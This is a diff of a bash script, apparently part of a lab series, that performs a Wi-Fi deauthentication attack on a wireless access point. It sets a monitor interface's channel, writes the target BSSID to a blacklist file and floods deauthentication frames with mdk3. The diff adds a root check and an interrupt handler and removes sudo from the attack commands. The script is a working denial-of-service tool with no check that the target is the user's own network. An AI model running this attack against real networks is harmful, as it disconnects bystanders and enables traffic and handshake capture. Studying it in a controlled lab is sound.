@@ -1,9 +1,16 @@
 #!/bin/bash
 # Deauthentication Attack Step 2: Perform a Wi-Fi deauthentication attack on a WAP using mdk3
+# Author: Alex Carbajal
 # Dependencies:
 # - https://salsa.debian.org/pkg-security-team/mdk3
 # - https://git.kernel.org/pub/scm/linux/kernel/git/jberg/iw.git
 # - https://github.com/BurntSushi/ripgrep
+
+# Check if running as root
+if [[ $EUID -ne 0 ]]; then
+  echo "Run as root"
+  exit
+fi
 
 BOLD="\e[1m"
 RED="\e[0;31m"
@@ -11,6 +18,13 @@ GREEN="\e[0;32m"
 BLUE="\e[0;34m"
 YELLOW="\e[0;33m"
 NORMAL="\e[0m"
+
+# Let user terminate the script at any time
+exit_script() {
+  echo -e "${RED}\n\nDeauthentication attack interrupted. Exiting...${NORMAL}"
+  exit 130
+}
+trap exit_script INT
 
 echo -e "${BLUE}${BOLD}*** Wi-Fi Deauthentication Attack Simulation Using Arch Linux ***${NORMAL}"
 echo -e "${YELLOW}=== Perform Deauthentication Attack Step 2: Attack ===${NORMAL}\n"
@@ -47,7 +61,7 @@ echo -e
 
 # Change the channel of the interface to match that of the software WAP being attacked
 echo -e "Setting channel of ${BOLD}${INTERFACE_NAME_MONITOR}${NORMAL} to ${BOLD}${CHANNEL}${NORMAL}"
-sudo iw dev "${INTERFACE_NAME_MONITOR}" set channel "${CHANNEL}"
+iw dev "${INTERFACE_NAME_MONITOR}" set channel "${CHANNEL}"
 echo -e
 
 # Create a temporary file containing BSSID to run the deauthentication attack on (blacklist mode in mdk3)
@@ -62,7 +76,7 @@ echo -e "Performing deauthentication attack on WAP ${BOLD}${BSSID}${NORMAL} usin
 echo -e "Press ${BOLD}Ctrl+C${NORMAL} to stop the attack"
 read -n 1 -s -r -p "Press any key to continue..."
 echo -e
-sudo mdk3 "${INTERFACE_NAME_MONITOR}" d -b "${TMP_BLACKLIST_FILE}"
+mdk3 "${INTERFACE_NAME_MONITOR}" d -b "${TMP_BLACKLIST_FILE}"
 echo -e
 
 echo -e "${GREEN}Deauthentication attack executed. View data with ${BOLD}Wireshark${NORMAL}${GREEN}.${NORMAL}"
